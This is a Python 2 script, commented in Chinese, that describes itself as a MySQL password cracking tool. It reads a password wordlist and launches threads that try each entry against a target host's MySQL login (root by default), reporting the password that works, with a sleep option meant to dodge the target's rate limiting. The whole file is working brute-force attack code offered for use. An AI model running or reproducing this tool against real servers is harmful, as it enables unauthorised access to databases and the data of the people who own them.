#!/usr/bin/python
# -*- coding: UTF-8 -*-

'''
Created on 2018年4月17日

@author: Administrator
'''
'''
Mysql 密码破解工具
其中连接数最好不要写太大,要不然会连不上数据库


'''
import argparse
try:
    import pymysql.cursors
except:
    print u'[>]没有安装mysql驱动,需要安装mysql驱动'
import thread  
import os
import sys
import time
#from _mysql import result

defaultencoding = 'utf-8'
if sys.getdefaultencoding() != defaultencoding:
    reload(sys)
    sys.setdefaultencoding(defaultencoding)
threadNum = 0 # 当前线程数
FLAG=True
print u'''
这些要显示很NB的logo图片
'''   

parser = argparse.ArgumentParser()
parser.add_argument('-hh', '--host', help=u"主机IP,必输")
parser.add_argument('-p', '--port', help=u"mysql端口", default=3306, type=int)
parser.add_argument('-t', '--threads', help=u"线程数,这里不要设置太多,有可能会导致后面不能正常连接数据库" , default=5, type=int)
parser.add_argument('-n', '--name', help=u"用户名" , default='root')
parser.add_argument('-f', '--filepath', help=u"文件路径,必输")
parser.add_argument('-db', '--databasename', help=u"要连接的数据库名" , default='information_schema')
parser.add_argument('-s', '--sleep', help=u"休眠时间,防止访问频繁被对方限制" , default=0,type=int)

args = parser.parse_args()

# 主机IP
host = args.host
# mysql端口号
port = args.port
# 开启线程数
threadCount = args.threads
# 数据库用户
username = args.name
#
# 文件路径
filepath = args.filepath
#数据库名
databasename = args.databasename

sleeptime = 0.01
print str(type(host)) ==str('NoneType')
print type(host) == 'NoneType'
# 判断主机是否输入
# if str(type(host)) == 'NoneType':
#     print u"请输入IP地址"
#     sys.exit()
# 判断密码文件是否输入
# if str(type(host)) == 'NoneType':
#     print u"请输入密码文件文件路径"
#     exit()


def getconn(host,port,username,pwd,databasename):
    global threadNum
    global FLAG
#     print '进入到线程中'
    try:
        pymysql.connect(host=host, port=port, user=username, password=pwd, db=databasename, charset='utf8mb4', autocommit=True, cursorclass=pymysql.cursors.DictCursor)
        print u'密码破解成功 : ',pwd
        # 破解成功
        FLAG = False
    except Exception ,es:
        print str(es)
        pass
    finally:
        threadNum = threadNum - 1
#         print u'关闭一个线程'
    pass


def dothreads(host,port,username,pwd,databasename):
    global threadCount
    global threadNum
    global sleeptime
#     if threadNum<threadCount:
    thread.start_new_thread(getconn,(host,port,username,pwd,databasename))
    threadNum = threadNum + 1
#     print u'开启一个线程 '
#     print u'当前线程数 '+str(threadNum)
    time.sleep(sleeptime)
#     else:
#         print u'线程池超限'

def beforethread(host,port,username,s,databasename):
    try:
    #pass
       
        dothreads(host,port,username,s,databasename)
#             getconn(host,port,username,s,databasename)
    except Exception,es:
        print str(es)  
        
         
with open(filepath,'r') as f:
    
    start_time = time.time()
    #pwd = f.readline().replace('\n','')
    locks=[];
    pwd = f.read()
    pwds = pwd.split('\n')
    x = 0
    for s in pwds:
        if FLAG:
            x =x + 1
            print u'当前个数: '+str(x)
            print u'当前密码: '+s
            if threadNum<threadCount:
                beforethread(host,port,username,s,databasename)
            else:
                time.sleep(0.1)
                beforethread(host,port,username,s,databasename)
    
    print '%d second'% (time.time()-start_time)

